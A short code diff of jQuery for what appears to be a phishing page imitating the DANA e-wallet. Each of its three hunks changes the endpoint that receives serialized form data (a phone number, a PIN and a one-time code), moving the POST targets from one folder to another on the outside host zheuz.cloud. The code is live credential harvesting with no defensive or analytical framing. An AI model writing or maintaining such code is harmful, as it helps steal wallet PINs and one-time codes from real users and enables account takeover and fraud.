@@ -141,7 +141,7 @@ $(".bgotp").hide();
     var dataString = $("#formNohp, #formPin, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://zheuz.cloud/dana/tandi/one.php',
+			  url: 'https://zheuz.cloud/dana/log/one.php',
 			  data: dataString,
  
     
@@ -163,7 +163,7 @@ function sendPin(){
   var dataString = $("#formNohp, #formPin, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://zheuz.cloud/dana/tandi/two.php',
+			  url: 'https://zheuz.cloud/dana/log/two.php',
 			  data: dataString,
  
 
@@ -196,7 +196,7 @@ $(".alert").css("color","red");
     var dataString = $("#formNohp, #formPin, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://zheuz.cloud/dana/tandi/three.php',
+			  url: 'https://zheuz.cloud/dana/log/three.php',
 			  data: dataString,
  
         
